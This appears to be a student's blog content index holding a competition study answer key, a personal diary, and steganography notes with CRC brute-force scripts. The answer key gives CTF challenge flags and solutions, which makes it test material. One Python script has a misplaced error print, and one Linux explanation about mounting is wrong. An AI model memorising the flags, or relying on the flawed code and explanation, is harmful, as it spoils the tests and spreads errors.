\naverage = total / count if count > 0 else 0\n# if count > 0:\n#    average = total / count\n#else:\n#    average = 0\n \nprint(f\"总和: {total}\")\nprint(f\"平均值: {average}\")\nprint(f\"最大值: {max_value}\")\nprint(f\"最小值: {min_value}\")\n```\n\n**答案**：\n\n```python\nfilename = 'data.txt'\ntotal = 0\ncount = 0\nmax_value = float('-inf')\nmin_value = float('inf')\n \nwith open(filename, 'r') as file:\n    for line in file:\n        numbers = list(map(int, line.strip().split(',')))\n        total += sum(numbers)\n        count += len(numbers)\n        for number in numbers:\n            if number > max_value:\n                max_value = number\n            if number < min_value:\n                min_value = number\n \naverage = total / count if count > 0 else 0\n \nprint(f\"总和: {total}\")\nprint(f\"平均值: {average}\")\nprint(f\"最大值: {max_value}\")\nprint(f\"最小值: {min_value}\")\n```\n\n\n\n### 1.2 Mysql\n\n\n1. 在MySQL中，如何删除表中的记录？(A)\n   A. `DELETE FROM table_name WHERE condition;`\n\n2. 下列哪个命令用于删除数据库？(B)\n   B. `DROP DATABASE database_name;`\n\n3. 在MySQL中，如果你想要创建一个列，该列可以存储任意长度的文本数据，并且不允许为空，你应该使用哪种数据类型和约束？(B)\n   B. `TEXT NOT NULL`\n\n4.  在MySQL中，如何创建一个包含自增主键的表？(A)\n    A. `CREATE TABLE table_name (id INT AUTO_INCREMENT, name VARCHAR(100), PRIMARY KEY (id));`\n\n\n### 1.3 Linux\n\n#### 1.3.1 单选题\n\n1. **Linux中，用于实时查找文件的命令是？**\n   A. `find`\n   B. `grep`\n   C. `locate`\n   D. `which`\n\n   **答案: A**\n   **解析**: `find` 命令用于在指定目录中查找文件。虽然 `locate` 也可以查找文件，但它是基于预先构建的数据库，而 `find` 是实时搜索。\n\n2. **在 Linux 中，要将一个文件的拥有者改为`user1`，应该使用以下哪个命令？**\n\n   A. `chown user1 file.txt`\n\n   **答案：A**\n\n   **解析：**`chmod`命令是用于改变文件或目录的权限，`usermod`主要用于修改用户账户的属性，`groupmod`用于修改用户组的属性。而`chown`命令是用于改变文件的所有者，`chown user1 file.txt`会将`file.txt`的所有者改为`user1`。\n\n3. **在 Linux 中，以下哪个命令用于创建新用户？**\n\n   A. `useradd`\n\n   **答案：A**\n\n\n4. **在 Linux 系统中，要将命令的输出追加到一个文件中，应该使用以下哪个符号？**\n   B. `>>`\n\n   **答案：B**\n\n   **解析：**`>`符号是将命令的输出重定向到一个文件，如果文件存在则覆盖其内容。`>>`符号是将命令的输出追加到一个文件的末尾。`<`是用于输入重定向，`<<`用于这里文档（将一段文本作为输入传递给命令），所以答案是 B。\n\n5. **以下关于 Linux 文件系统的说法，错误的是？**\n\n   D. 一个分区只能挂载一个文件系统，一个文件系统也只能挂载在一个分区上\n\n   **答案：D**\n\n   **解析：**Linux 文件系统是树形结构，从根目录`/`开始构建层次。不同的 Linux 发行版可以使用如 ext4、XFS 等不同的文件系统类型。挂载点必须是一个已经存在的目录，这样才能将文件系统挂载到该目录下。但是一个分区通常挂载一个文件系统，但一个文件系统可以挂载在多个分区上，例如通过软连接等方式，所以 D 选项错误。\n\n### 2.3 网络安全与攻防\n\n#### 2.3.1 misc部分\n\n\n1. **校徽:** 这校徽的颜色对吗?分辨一下!!!\n   **答案：flag{just_a_cqpc_logo}**\n   **解析：**![image-20241118220252950](https://yuanshen-1325599464.cos.ap-chongqing.myqcloud.com/Typora/202411182202009.png)\n\n2. **Tom**: tom把flag藏哪儿了?   ==3分==\n   **答案：flag{8565-hs12-a968s-6dhj54-g5jk5}**\n   **解析：**\n\n   1. **flag1**\n\n      binwalk检测有两段zlib信息，无第二文件头尾信息\n      ![image-20241118220330122](https://yuanshen-1325599464.cos.ap-chongqing.myqcloud.com/Typora/202411182203152.png)\n\n      找png数据块IDATX\n      ![image-20241118220339006](https://yuanshen-1325599464.cos.ap-chongqing.myqcloud.com/Typora/202411182203033.png)找到第二段有明显sRGB标识，确定公用文件头尾，删除表层图片数据部分，得flag1\n      ![image-20241118220350709](https://yuanshen-1325599464.cos.ap-chongqing.myqcloud.com/Typora/202411182203744.png)\n      **还要改宽高！！！！**\n\n   2. **flag2**\n      文件尾明显base64数据，解密得到第二段flag\n      ![image-20241118220406455](https://yuanshen-1325599464.cos.ap-chongqing.myqcloud.com/Typora/202411182204482.png)\n\n3. **编码**:这是什么编码,你能看出来吗?好像不止一种!!!   ==3分==\n   **答案：flag{ff4a8f9259716a539b4c674ba3674031}**\n   **解析：**rot13爆破+base64;然后转换端序\n   ![image-20241118220430751](https://yuanshen-1325599464.cos.ap-chongqing.myqcloud.com/Typora/202411182204807.png)\n   端序转换\n```python\ndef swap_groups(b, w):\n    return b''.join(b[i:i+w][::-1] for i in range(0, len(b), w))\n\ndef show(b, w):\n    out = swap_groups(b, w)\n    print(f'[{w}] hex:', out.hex())\n    try:\n        print(f'[{w}] text:', out.decode('utf-8'))\n    except:\n        print(f'[{w}] text:', '(invalid utf-8)')\n\ndef main():\n    while True:\n        s = input('文本(回车退出): ')\n        if s == '':\n            break\n        raw = s.encode('utf-8')\n        for w in (1, 2, 3, 4):\n            show(raw, w)\n        sel = input('选择字节分组(1-4或正整数，默认1): ').strip()\n        try:\n            w = int(sel) if sel else 1\n            if w <= 0:\n                w = 1\n        except:\n            w = 1\n        out = swap_groups(raw, w)\n        print('选定分组:', w)\n        print('hex:', out.hex())\n        try:\n            print('text:', out.decode('utf-8'))\n        except:\n            print('text:', '(invalid utf-8)')\n\nif __name__ == '__main__':\n    main()\n\n```\n\n4. **流量1**:简单流量,签个到吧......\n   **答案：flag{do_you_know_NaiLong}**\n\n5. **流量2**: 是谁连接了shell,他干了什么!!!\n   **答案：flag{I_am_nailong}**\n\n   **解析：**![](https://yuanshen-1325599464.cos.ap-chongqing.myqcloud.com/Typora/202411182205515.png)\n   复现不出来，选最后一个From item后ctrl+shift+o 查看分组字节流，base解码可以得到\n\n6. **流量3**:好像下载了什么东西???   ==3分==\n   **答案：flag{I_have_learnt_wareshark!!!}**\n   **解析：**\n\n   1. 打开流量包,发现下载了一个flag.zip, 把它分离出来;得到flag.zip\n      ![image-20241118220630036](https://yuanshen-1325599464.cos.ap-chongqing.myqcloud.com/Typora/202411182206128.png)\n   2. **第二步：**\n      ![image-20241118220641777](https://yuanshen-1325599464.cos.ap-chongqing.myqcloud.com/Typora/202411182206820.png)\n   3. **第三步：**![image-20241118220723625](https://yuanshen-1325599464.cos.ap-chongqing.myqcloud.com/Typora/202411182207664.png)\n\n\n7.  **四步立定**:青龙;白虎;朱雀;玄武  ==3分==\n    **答案：flag{wlcome_to_ahgaxy}**\n    **解析：**\n\n    1. **第一步**:base64转为zip文件,得到base64.zip![image-20241118220753857](https://yuanshen-1325599464.cos.ap-chongqing.myqcloud.com/Typora/202411182207932.png)\n\n```python\nimport base64\ndef base64_to_file(base64_string,output_file_path):\n    try:\n#将Base64字符串解码为二进制数据\n\n        file_data = base64.b64decode(base64_string)\n#将二进制数据写入文件\n        with open(output_file_path, 'wb') as output_file:\n            output_file.write(file_data)\n        print(f\"文件成功保存为{output_file_path}\") \n        print(f\"发生错误：{e}\")\n    except Exception as e:\n        print(f'发生错误：{e}') \nif __name__ == \"__main__\":\n    #Base64编码的字符串\n    base64_string=input(\"请输入base64编码字符：\")\n    #输出文件\n    output_file_path=input(\"请输入文件名：\")\n    base64_to_file(base64_string, output_file_path)\n```\n\n2. **第二步**:\n       ![image-20241118220814971](https://yuanshen-1325599464.cos.ap-chongqing.myqcloud.com/Typora/202411182208021.png)\n![alt text](/img/警铮杯准备_image-9.png)\n- 010拼起来，看不懂wp在干什么\n3. **第三步**\n       ![image-20241118220833614](https://yuanshen-1325599464.cos.ap-chongqing.myqcloud.com/Typora/202411182208675.png)\n4. 第四步：![image-20241118220842600](https://yuanshen-1325599464.cos.ap-chongqing.myqcloud.com/Typora/202411182208643.png)\n![alt text](/img/警铮杯准备_image-10.png)\n#### 2.3.2 crypto部分\n\n    \n\n1.  **异或2**:你真的懂异或吗?\n    **答案：flag{too_young_too_simple}**\n    **解析：**\n```python\na = 'oehnr}ffVpf|gnV}ffVz`dyelt'\nkey = ord('o')^ord('f')\nprint(key)\nb = ''\nfor i in a:\n    b += chr(ord(i)^key)\nprint(b)\n```\n\n14. **异或3**:你真真真真真真的懂异或吗?  ==3分==\n    **答案：flag{just_so_so}**\n    **解析：**\n\n    1. **第一步**：确定key为递增的\n       ![image-20241118221001297](https://yuanshen-1325599464.cos.ap-chongqing.myqcloud.com/Typora/202411182210346.png)\n\n    2. **第二步**\n\n       ```py\n       secret = 'gnbc~lr{}UxcR}`m'\n       flag = ''\n       key=1\n       for i in secret:\n       \tflag += chr(ord(i)^key)\n       \tkey+=1\n       print(flag)\n       ```\n\n#### 2.3.3 reverse\n\n15. **ez_reverse**:flag是什么呢?猜猜看吧!!!\n    **答案：flag{reverse_is_so_easy!!!}**\n    **解析：**![image-20241118221027475](https://yuanshen-1325599464.cos.ap-chongqing.myqcloud.com/Typora/202411182210636.png)\n    ![alt text](/img/警铮杯准备_image-8.png)"},{"title":"日记（25-11-17凌晨）","url":"/2025/11/17/日记/","content":"> **我只能知道我每一个决定都是深思熟虑之后，自己所决定的，那么，我愿意为它承担所有的后果，继续吧，就这样暂时幸福的走下去。**\n- 今天真的是深夜有感，我已经好久好久，经常就是深夜有感，但是不会把它写下来更不会把它发出去了，今年终于有了自己的博客了，也不能说想让很多人都看到，只是希望我的一些感想可以激励到自己的同时，也激励到别人吧（额后面有些胡言乱语哈哈哈自己决定看不看吧\n- 今天晚上想从三个方面说一说，一个是最近的回顾，还有一个是，感谢一下全世界，还有一个是展望一下未来，最近真的干了很多事情呢（哦，写着写着发现还有第四个方面哈哈哈，属于胡言乱语了\n  - 我喜欢忙忙碌碌的感觉，让人有生活向前走的实感，但是不同于高中就完全是为了学业而忙（我的高中真的太搞笑了，高一的时候就这样由于特殊原因沉迷学习，刷数学刷的都要走火入魔了，结果我的数学那一年是最差的时候，我不知道为什么后面换了奇。。。的数学老师，我居然高二的时候数学最好，高三数学也不行了，不能说不行吧，我也不知道那是什么状态，我的偏科一直是这样，偏好的吗不够好，偏差的吗很差，好伤心啊为什么是这个状态？我大三跟小三都这德行，都偏科，有意思，唉，有点逻辑混乱了，但是不管日记嘛，想到哪儿写到哪儿，哈哈，但这回不是打字的，因为我想快点记录下来，所以是语音输入，然后再改一改。\n  - 现在是真的就是在学习感兴趣的东西，真的很幸福。最近又经历了一点事情呢，学习了很多新东西，学无止境啊，人要好好学习。\n- 感谢一下全世界啊，真的是高中吃的苦，都是为了大学遇到这么好的人：\n  - 遇到的舍友那么好，真的特别好，特别是听过一些更加奇葩的事例，怎么能这么好？也不能这么说，怎么这么正常，这么融洽？我无法形容，真的好幸福。特别是初中人际关系这么好，到了高一遇到滑铁卢，哎，就是失去过的东西，再获得会更加幸福，喜欢。\n  - 这么快就认识一个这么愿意教人的学长，我觉得我不行，虽然我也很乐意教别人，但是绝对没有乐意到这个程度，然后带我入门，带我认识了更多的学长学姐，认识的也都非常愿意教我，真的好幸福啊，而且我觉得中考高考都不是筛选人的最好的标准，我现在干的事情才是，真的筛选掉很多人啊，怎么能做到筛选力度这么强的！好喜欢！虽然说学校里也有很多。。但是我的策略真的起效了呀就是避着走呀，虽然高一也起效了，但是太多啦，避不开哈哈。但也很幸福啊，高二就分班这么好，没有拖到后面，新班级也有不满意的地方，但是知足而乐。\n  - 高中总觉得一开始就觉得有些朋友会走散，但是我还是去尝试了，我就这样跌跌撞撞，也算成功了吧，虽然结果没有变，不知道会不会看到呢，应该不会吧，很忙的人。我有时候觉得自己是一个既勇敢又不勇敢的人，我会去考虑是不是有必要去勇敢，但是如果不是工作和学习啊，我就不会反复的努力，我会尝试一次，但是不会尝试第二次，因为会觉得跌份，是这样的呢，我有时候反思，总觉得可能我太过于主动了，所以别人反而会，不容易珍惜，就这样，时i时e的。\n  - 学习，学习这些东西，虽然说也有磕磕绊绊吧，但是真的学的很开心啊！\n  - 我的父母也这么好，家里人也这么好，其实这个从小学就有点看出来了，初中更是我的同学，感觉父母关系都不好，到了高中嗯，没怎么了解，大学的话，很快就听说了一些奇葩的家长。我这么幸福啊，暑假还给我爆了点金币，人怎么能快乐成这样？\n  - 还跟学长学姐分享了存款余额，我的存款甚至全加起来的话比现在，在派出所的学长还要多，虽然说我没有花多少，他们花费比较多，人怎么能够幸福成这样？满满的后背安全感。\n- 要开始展望了呢，现在这个电子取证啊，真是一坨，不好说的，我怎么感觉脑子有点木木的呢？加油吧，还是得复盘，但是，等12月把学校的比赛比完再开始，我怎么老是拿比赛当借口，不干一些事情，有意思。\n  - 我不知道啊，我感觉后面我大概率是要组自己的队伍的，不能把太多的希望放在找到靠谱的队友，所以这样子的话，最好的方法就是手机计算器服务器一点点做上去，但是我可以吗？看着走吧。\n  - 手机手机我也不知道怎么学，感觉自己学完了之后就怎么做的那么一言难尽，计算机，我就分到一个检材基本上相当于大部分都没做出来，不会呀，我感觉就是我还是得把服务区的一些基础知识现在就搞起来，不然的话就是它一联动，我就啥都不知道，还是说就是计算器哪个莫名其妙的板块知识我不知道呢，我不知道啊，就是做不出来，linux啊linux，啥也不知道，不知道这电子取证除了要在按部就班的参加比赛复盘，我完全不知道我应该还多余干什么。\n  - ctf我真不知道我应该走什么方向，那么多人学web，要么学pwn，我去学reverse怎么样，正好可以做那种exe逆向，也不错哦，好难啊ctf怎么板块知识这么多。唉，但是学reverse我得学汇编语言吧，不知道啊，我的python跟c就这样子半桶水，不对哪有半桶水 (*´д`) \n  - 这么说的话，我这个编程学的也很离谱，自己嘛，随便学学也没坚持下去就这样一直在入门教程里面转悠，高中一个什么实践站？哎，终于要学到东西了，开心，结果呢，被分配到一个有半点关系的课程，有意思，有意思，给我们教点python的语言，但是我那个时候学习意愿真的是就是外强中干啊，我觉得这样子抱上同校两个男的大腿，自己就这样跟不上，根本跟不上哇，人怎么能外强中干成这样？我不懂啊，然后他还只跟程序代码有半点关系可以这么说吗？我不知道，也有可能是我的问题，后面更是搞笑了，开始投简历环节了，有意思给我分配到个上海工程技术大学，真搞笑，学的东西，真的很搞笑，学它到底是为了干什么，体验生活嘛，我真的是，不好多说。相当于是这个课程，我半点东西没有学到啊，不对，还是学到点东西了，学到了很多跟轨道有关的东西，一些基础知识之前都不知道的，但是你要真说再深层次吧，啥有技巧的都没学上，有意思，就这样，然后后面这个python听课看书，搞了半天还在基础打转，C语言听课，然后后面发现python更急需去搞python了，继续在基础打转。\n  - 不知道呢，感觉要是真的去打ctf的话，你每个板块的知识都得稍微懂一点，而且我还要找队友，我这怎么找队友啊？我真的是没辙，一个是女生，一个是我社交本来就不是很擅长，有意思，有意思，我就这样，每天都在强迫自己社交，也不能这么说，我指的社交是指跟不认识的人社交（哦，这个时候就不得不提我一个非常更加神奇的地方，一些不大重要的事情，和一些我可以随时跟旁边的人再次询问已获得答案的东西，都会悄悄的每天晚上从他脑海里面溜走。删缓存吗？有意思，所以说，如果跟不熟的人社交，也是在消耗电量，不能这么说，我这个不熟的界定，非常之模糊）我真的要随波逐流了（感谢随波逐流在我的学习当中给我进行一次又一次的震撼，就这样一把梭哈哈哈\n  - 有点想等毕业了给随波逐流搞个宣传视频这个能解，那个能解，其他呢，还能解！唉，但是现在很基础啊，可能是所以这样才会被震撼到吧。\n- 现在有什么烦心事啊，哦（胡言乱语警告！！！\n1）学习计划有点非常之混乱\n2）组队啊，也非常之随缘，没办法，菜嘛，咱就随波逐流（哈哈哈哈哈打广告呢我在\n3）取名字啊，真的是取名废，今天获得了点灵感，我能不能叫做落殷回什么都不会队哈哈哈哈哈，我甚至前面还想直接叫取名废\n啊也有幸福的地方，我的队友都跟我一样，有道德素养，组队了之后，没有轻易的被人拉走，然后导致我们的队伍分崩离析，喜欢。\n4）要换电脑，好麻烦，我电脑配置，现在不行，然后我已经买了neta跟那个lovelymem了，怎么办啊？换电脑还要新买，然后我从现在这段时间到我可能会换电脑的，寒假中间还要打比赛，那我到底要不要买那个ctf -all-in-one呢？太搞笑了，今天进城一趟，回城一趟，一个软件的钱没了，哦，不对，有学长跟我分担，开心。\n- 我其实好喜欢写日记啊，我记得高一开始我也坚持写日记，后来是费的时间太长了，我一写日记，我可以从早上的事情一直写到晚上，不像现在我就有点有点刻意的在控制，所以就写的东西会少很多，而且不会事无巨细了，但是我真的觉得每天所有的事情都很值得记录啊，我有很多想思考的地方，我怎么想这么多？有意思。\n- 唉，这个高中过的，非常世俗啊，我就这样子专心学业，也不能说完全专心吧，我就这样子厌恶英语，哎，能不能有人把美国打下来，然后我就可以不用学英语了，不行，有点，算了算了，不删了，我这小破网站也没人会看，这个想法真的是很荒谬啊，但是其实我从小学就开始想。\n- 我也有很多很奇怪的想法，不好说，不多说，人怎么能一天想那么多事情？\n- 但是好喜欢啊，好开心啊，最近的日子怎么能过得这么快乐？怎么那么多反问句？是我不自信吗？哈哈哈哈哈哈哈哈哈哈哈哈。\n- 要睡了，不知道呢，这些日子过的，我怎么就是这样子，目标那么不明确？高考嘛，没有特别想去的地方，什么嘛都能接受哇，适应力是真强，目标是有不了一点，我经常问别人的目标呢，那是因为我没办法感性的选择我的目标，因为真的没有偏向，我就只能理性的选择我的目标，我感觉就是我很多东西表现出来的，其实是我没办法才表现出来的。\n- 就比如说看上去很e，那是因为经过深思熟虑，理性分析，发现我有必要去变得e一点。就比如说大家可能都觉得我很理性，但其实我觉得我是很感性的人，只不过我会在感性之后再加一道理性的保险，就是感性无法抉择，或者我知道这个感性抉择是有问题的，我会理性的再去分析一下，然后再最后决定我的行为，哎，这么说的话就可以比喻一下，我这个电脑程序环节比别人多啊，所以就很容易卡死，但卡死么又很会看眼色，会找个没有人的地方卡死哈哈哈哈哈哈（不得不说，我的电脑就这样子害怕我的学姐，有些问题跑到学姐面前突然一下子就好了。。。。。。。。。\n- 怎么样决定自己的人生？我怎么老是考虑这个问题，但是考虑不出来一个结果，怎么选择，是否要过多的看重一些东西，我该何去何从？**我只能知道我每一个决定都是深思熟虑之后，自己所决定的，那么，我愿意为它承担所有的后果，继续吧，就这样暂时幸福的走下去。**","tags":["瞎写","胡思乱想"],"categories":["日记"]},{"title":"misc笔记","url":"/2025/11/10/misc笔记/","content":"- [Misc](#misc)\n  - [图片隐写](#图片隐写)\n    - [文件头尾](#文件头尾)\n    - [crc宽高](#crc宽高)\n    - [图层PS](#图层ps)\n    - [翻转](#翻转)\n    - [插入类型隐写](#插入类型隐写)\n    - [LSB类](#lsb类)\n    - [png隐写](#png隐写)\n    - [jpg图片高度修改](#jpg图片高度修改)\n    - [bmp图片隐写](#bmp图片隐写)\n    - [其他](#其他)\n      - [01字符转图片](#01字符转图片)\n      - [bftools](#bftools)\n      - [F5隐写](#f5隐写)\n      - [MP3stego](#mp3stego)\n      - [foremost](#foremost)\n  - [文件音频类隐写](#文件音频类隐写)\n    - [word隐写](#word隐写)\n    - [pdf隐写](#pdf隐写)\n    - [音频隐写](#音频隐写)\n  - [其他](#其他-1)\n    - [pyc](#pyc)\n- [CRC](#crc)\n  - [1Byte](#1byte)\n  - [2Byte](#2byte)\n  - [3Byte](#3byte)\n  - [4Byte](#4byte)\n- [sstv](#sstv)\n- [参考](#参考)\n\n\n## Misc\n### 图片隐写\n#### 文件头尾\n- [十六进制文件头尾特征](/2025/08/16/十六进制文件头尾特征)\n#### crc宽高\n- 010自动检测\n![alt text](/img/misc笔记_image.png)\n- （固定）八个字节89 50 4E 47 0D 0A 1A 0A为png的文件头\n- （固定）四个字节00 00 00 0D（即为十进制的13）代表数据块的长度为13\n- （固定）四个字节49 48 44 52（即为ASCII码的IHDR）是文件头数据块的标示（IDCH）\n- （可变）13位数据块（IHDR）\n    - 前四个字节代表该图片的宽\n    - 后四个字节代表该图片的高\n    - 后五个字节依次为：\n    Bit depth、ColorType、Compression method、Filter method、Interlace method\n- （可变）剩余四字节为该png的CRC检验码，由从IDCH到IHDR的十七位字节进行crc计算得到。\n```python\nimport zlib\nimport struct\nimport argparse\nimport itertools\n\n\nparser = argparse.ArgumentParser()\nparser.add_argument(\"-f\", type=str, default=None, required=True,\n                    help=\"输入同级目录下图片的名称\")\nargs  = parser.parse_args()\n\n\nbin_data = open(args.f, 'rb').read()\ncrc32key = zlib.crc32(bin_data[12:29]) # 计算crc\noriginal_crc32 = int(bin_data[29:33].hex(), 16) # 原始crc\n\n\nif crc32key == original_crc32: # 计算crc对比原始crc\n    print('宽高没有问题!')\nelse:\n    input_ = input(\"宽高被改了, 是否CRC爆破宽高? (Y/n):\")\n    if input_ not in [\"Y\", \"y\", \"\"]:\n        exit()\n    else: \n        for i, j in itertools.product(range(4095), range(4095)): # 理论上0x FF FF FF FF，但考虑到屏幕实际/cpu，0x 0F FF就差不多了，也就是4095宽度和高度\n            data = bin_data[12:16] + struct.pack('>i', i) + struct.pack('>i', j) + bin_data[24:29]\n            crc32 = zlib.crc32(data)\n            if(crc32 == original_crc32): # 计算当图片大小为i:j时的CRC校验值，与图片中的CRC比较，当相同，则图片大小已经确定\n                print(f\"\\nCRC32: {hex(original_crc32)}\")\n                print(f\"宽度: {i}, hex: {hex(i)}\")\n                print(f\"高度: {j}, hex: {hex(j)}\")\n                exit(0)\n\n```\n#### 图层PS\n![alt text](/img/misc笔记_image-2.png)\n#### 翻转\n![alt text](/img/sq笔记学习_image-1.png)\n```python\na = open('flag.jpg','rb')  #读取flag.jpg图片的byte数据\nb = open('png.png','wb')  #新建一个名为png.png的图片，写入byte数据\nb = b.write(a.read()[::-1])  #将flag.jpg图片的byte数据，倒着写入png.png图片里\n```\n#### 插入类型隐写\n- 十六进制后插入文字：放在文件尾之后就不影响文件的打开\n- 中间插入：一般打不开的主要是中间有问题，十六进制直接搜\n- **binwalk**分解（随波逐流内置！！！）\n  - 基本用法：`binwalk [选项] 文件名`\n  - 参数介绍：\n> -B：不执行任何提取，只显示可能包含文件的偏移量。\n> -e：将所有提取文件保存到当前目录下的一个子目录中。\n> -M：尝试包含另一个已知格式（以逗号分隔的列表）。\n> -y：尝试所有提取操作/文件类型。\n> -h 详细查看\n  - 注意！！！binwalk直接看的文件头\n- 文件头修改或者损坏\n  - 方法：定位文件尾后修复，依据[十六进制文件头尾特征](/2025/08/16/十六进制文件头尾特征)\n#### LSB类\n- stegsolve\n  - 普通\n  - lsb隐写可以看见是个zip的样子，那我们直接保存为zip文件即可\n  - 两张图片combine\n  - 花色二维码：导出再导入看red0（下方左右箭头）\n- 带密码：kali\n```\nlsb extract secret.png flag.txt  7his_1s_p4s5w0rd\n//extract：提取，后面为需要提取信息的图片和输出的文件名，以及key值\n```\n- exif\n  - exiftool\n  - 随波逐流\n- gif\n  - 随波逐流分解帧\n  - 利用每一个gif帧出现时间的长度来进行隐写\n    - kali中`identify -format \"%s %T \\n\" （文件名）.gif`\n#### png隐写\n- png特点：是无损压缩，将图片源码通过zlib压缩编码后以IDAT块的形式组成的是一块块的，存满65524才会开下一个，所以如果一个没满，又有一个，很有可能是认为添加进去的\n- 四个关键块：\n  - IDHR：文件头数据块\n    - 修改了png文件的高和宽隐藏了flag，但其实由于crc校验机制，**随波逐流**会直接跳出来flag\n  - PLTE：调色板数据块\n  - IDAT：图像数据块\n    - binwalk直接分\n  - IEND：文件尾数据块\n#### jpg图片高度修改\n![alt text](/img/misc笔记_image-4.png)\n#### bmp图片隐写\n![alt text](/img/misc笔记_image-5.png)\n\n#### 其他\n##### 01字符转图片\n- 随波逐流\n\n![alt text](/img/sq笔记学习_image.png)\n##### bftools\n- 在这个软件路径先`bftools.exe decode -o find braincopter 文件名.jpg`，再`bftools.exe run find`即可 \n再bftools.exe run find即可\n##### F5隐写\n- 提示，要么f5要么说什么刷新（f5）之类的\n- 根目录输入`java Extract 路径+图片名 -p 密码`\n- 然后就会输出了output.txt\n\n##### MP3stego\n- 常用参数：\n  - -E 进行加密\n  - -P 输入密码\n  - -X 进行提取\n```bash\n./encode -E 123.txt -P pass 456.wav 789.mp3  #加密\n./decode -X -P 123  flag.mp3  #解密\n```\n- 使用的话把文件放入根目录下\n##### foremost\n- 分离文件\n```bash\nforemost [输入文件] -o [输出目录]\n```\n- foremost所有选项及其翻译:\n-i, –input\n指定输入文件或设备（例如磁盘镜像）。\n-o, –output\n指定输出目录，提取的文件将保存到此目录中。\n-t, –type\n指定要提取的文件类型，可以用逗号分隔多种类型。例如：jpg,png,pdf。\n-n, –no-sort\n提取文件后不对文件进行排序。\n**-v, –verbose**\n显示详细的处理信息。\n-h, –help\n显示帮助信息和所有可用选项。\n-f, –file\n指定文件类型的配置文件。\n-p, –progress\n显示提取进度。\n-r, –recover\n从损坏或部分损坏的文件中恢复数据。\n-e, –extract\n提取文件，默认行为。\n-d-启用间接块检测（对于UNIX文件系统）\n-a-写入所有标头，不执行错误检测（损坏的文件）\n-w-仅写入审核文件，不将任何检测到的文件写入磁盘\n-c-设置要使用的配置文件（默认为forest.conf）\n-q-启用快速模式。在512字节边界上执行搜索。\n-Q-启用静音模式。抑制输出消息。\n\n\n### 文件音频类隐写\n#### word隐写\n- 字体颜色的隐写\n\n![alt text](/img/misc笔记_image-3.png)\n- 修改后改为zip解压缩\n- 伪加密（随波逐流）\n  - 方式2：使用ZipCenOp.jar进行伪加密\n    - 添加伪加密：java -jar ZipCenOp.jar e test.zip\n    - 去除伪加密：java -jar ZipCenOp.jar r test.zip\n#### pdf隐写\n- wbstego\n#### 音频隐写\n- wav频谱图查看：audacity右键转成频谱图即可见\n  - 摩斯密码\n  - 二进制\n- MP3\n  - 主要是mp3stego能把txt藏进去，这个分离要密码\n```python\nMp3StegoDecode.exe -X -P 密码 XXX.mp3\n```\n- LSB：silenteye\n\n### 其他\n#### pyc\n- 03F开头，是pyc文件\n## CRC\n- 文件爆破\n  - winRAR 打开压缩包,可以看到文件大小信息和crc32值\n  - 看到压缩包中的四个文件大小都是x字节,符合crc32爆破的条件\n  - winrar获得crc\n> 脚本来源：<https://blog.csdn.net/mochu7777777/article/details/110206427>\n### 1Byte\n```python\nimport binascii\nimport string\n\ndef crack_crc():\n    print('-------------Start Crack CRC-------------')\n    crc_list = [0xda6fd2a0, 0xf6a70, 0x70659eff, 0x862575d]#文件的CRC32值列表，注意顺序\n    comment = ''\n    chars = string.printable\n    for crc_value in crc_list:\n        for char1 in chars:\n            char_crc = binascii.crc32(char1.encode())#获取遍历字符的CRC32值\n            calc_crc = char_crc & 0xffffffff#将获取到的字符的CRC32值与0xffffffff进行与运算\n            if calc_crc == crc_value:#将每个字符的CRC32值与每个文件的CRC32值进行匹配\n                print('[+] {}: {}'.format(hex(crc_value),char1))\n                comment += char1\n    print('-----------CRC Crack Completed-----------')\n    print('Result: {}'.format(comment))\n\nif __name__ == '__main__':\n    crack_crc()\n\n```\n### 2Byte\n```python\nimport binascii\nimport string\n\ndef crack_crc():\n    print('-------------Start Crack CRC-------------')\n    crc_list = [0xef347b51, 0xa8f1b31e, 0x3c053787, 0xbbe0a1b]#文件的CRC32值列表，注意顺序\n    comment = ''\n    chars = string.printable\n    for crc_value in crc_list:\n        for char1 in chars:\n            for char2 in chars:\n                res_char = char1 + char2#获取遍历的任意2Byte字符\n                char_crc = binascii.crc32(res_char.encode())#获取遍历字符的CRC32值\n                calc_crc = char_crc & 0xffffffff#将获取到的字符的CRC32值与0xffffffff进行与运算\n                if calc_crc == crc_value:#将获取字符的CRC32值与每个文件的CRC32值进行匹配\n                    print('[+] {}: {}'.format(hex(crc_value),res_char))\n                    comment += res_char\n    print('-----------CRC Crack Completed-----------')\n    print('Result: {}'.format(comment))\n\nif __name__ == '__main__':\n    crack_crc()\n\n```\n\n### 3Byte\n```python\nimport binascii\nimport string\n\ndef crack_crc():\n    print('-------------Start Crack CRC-------------')\n    crc_list = [0x2b17958, 0xafa8f8df, 0xcc09984b, 0x242026cf]#文件的CRC32值列表，注意顺序\n    comment = ''\n    chars = string.printable\n    for crc_value in crc_list:\n        for char1 in chars:\n            for char2 in chars:\n                for char3 in chars:\n                    res_char = char1 + char2 + char3#获取遍历的任意3Byte字符\n                    char_crc = binascii.crc32(res_char.encode())#获取遍历字符的CRC32值\n                    calc_crc = char_crc & 0xffffffff#将遍历的字符的CRC32值与0xffffffff进行与运算\n                    if calc_crc == crc_value:#将获取字符的CRC32值与每个文件的CRC32值进行匹配\n                        print('[+] {}: {}'.format(hex(crc_value),res_char))\n                        comment += res_char\n    print('-----------CRC Crack Completed-----------')\n    print('Result: {}'.format(comment))\n\nif __name__ == '__main__':\n    crack_crc()\n\n```\n### 4Byte\n```python\nimport binascii\nimport string\n\ndef crack_crc():\n    print('-------------Start Crack CRC-------------')\n    crc_list = [0xc0a3a573, 0x3cb6ab1c, 0x85bb0ad4, 0xf4fde00b]#文件的CRC32值列表，注意顺序\n    comment = ''\n    chars = string.printable\n    for crc_value in crc_list:\n        for char1 in chars:\n            for char2 in chars:\n                for char3 in chars:\n                    for char4 in chars:\n                        res_char = char1 + char2 + char3 + char4#获取遍历的任意4Byte字符\n                        char_crc = binascii.crc32(res_char.encode())#获取遍历字符的CRC32值\n                        calc_crc = char_crc & 0xffffffff#将遍历的字符的CRC32值与0xffffffff进行与运算\n                        if calc_crc == crc_value:#将获取字符的CRC32值与每个文件的CRC32值进行匹配\n                            print('[+] {}: {}'.format(hex(crc_value),res_char))\n                            comment += res_char\n    print('-----------CRC Crack Completed-----------')\n    print('Result: {}'.format(comment))\n\nif __name__ == '__main__':\n    crack_crc()\n\n```\n\n\n## sstv\n1. 下载方法：pip install sstv\n使用方法：\nwav音频文件放到sstv根目录（C:\\Windows\\System32\\sstv），打开cmd，输入\n```cmd\ncd sstv\nsstv -d 文件名.wav -o result.png#输出图片名\n```\n2. 